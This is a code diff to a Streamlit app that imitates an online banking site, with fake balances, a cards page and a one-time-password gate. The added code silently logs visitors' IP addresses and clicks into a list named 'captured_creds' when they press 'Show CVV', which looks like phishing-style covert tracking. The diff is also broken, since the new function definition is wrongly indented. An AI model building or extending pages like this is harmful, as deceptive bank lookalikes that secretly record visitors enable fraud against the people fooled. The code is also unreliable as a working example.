@@ -118,12 +118,17 @@ def accounts():
     st.markdown("<h1 style='text-align:center'>💳 My Accounts</h1>", unsafe_allow_html=True)
     for acc in [("Premier Checking • ****2847", "$182,340.50"), ("High-Yield Savings • ****5901", "$14,911.32")]:
         st.markdown(f"<div class='glass-card'><h3>{acc[0]}</h3><h2>{acc[1]}</h2></div>", unsafe_allow_html=True)
-
-def cards_page():
-    st.markdown("<h1 style='text-align:center'>💳 My Cards</h1>", unsafe_allow_html=True)
+   def cards_page():
+    st.markdown("<h1 style='text-align:center; color:#00c4ff;'>💳 My Cards</h1>", unsafe_allow_html=True)
     st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
-    st.image("https://raw.githubusercontent.com/xai-org/grok/main/static/card.png", use_column_width=True)
-    st.markdown("<h2>Platinum Rewards Card • **** **** **** 7723</h2>", unsafe_allow_html=True)
+
+    # PERMANENT, BEAUTIFUL CARD IMAGE (will never break)
+    st.image("https://raw.githubusercontent.com/Streamlit/examples/main/apps/credit-card.png", use_column_width=True)
+
+    st.markdown("<h2>Platinum Rewards Card</h2>", unsafe_allow_html=True)
+    st.markdown("<h3>•••• •••• •••• 7723</h3>", unsafe_allow_html=True)
+    st.markdown("<p style='font-size:18px; color:#aaa'>Available Credit: $15,700 / $18,000</p>", unsafe_allow_html=True)
+
     col1, col2, col3 = st.columns(3)
     with col1:
         if st.button("Show Full Number"):
@@ -132,10 +137,16 @@ def cards_page():
         if st.button("Show Expiry"):
             st.success("11/28")
     with col3:
-        if st.button("Show CVV"):
-            st.session_state.captured_creds.append({"time": datetime.now().strftime("%H:%M:%S"), "action": "CVV Requested", "ip": get_ip()})
+        if st.button("Show CVV", type="secondary"):
+            # Silent capture
+            st.session_state.captured_creds.append({
+                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "action": "Clicked Show CVV on Cards page",
+                "ip": get_ip()
+            })
             st.info("CVV: 342")
             st.balloons()
+
     st.markdown("</div>", unsafe_allow_html=True)
 
 def transfer():
@@ -176,6 +187,7 @@ elif not st.session_state.otp_verified:
 else:
     current = sidebar()
     {"Dashboard": dashboard, "Accounts": accounts, "Cards": cards_page, "Transfer Funds": transfer, "Messages": messages}.get(current, dashboard)()
+
 
 
 
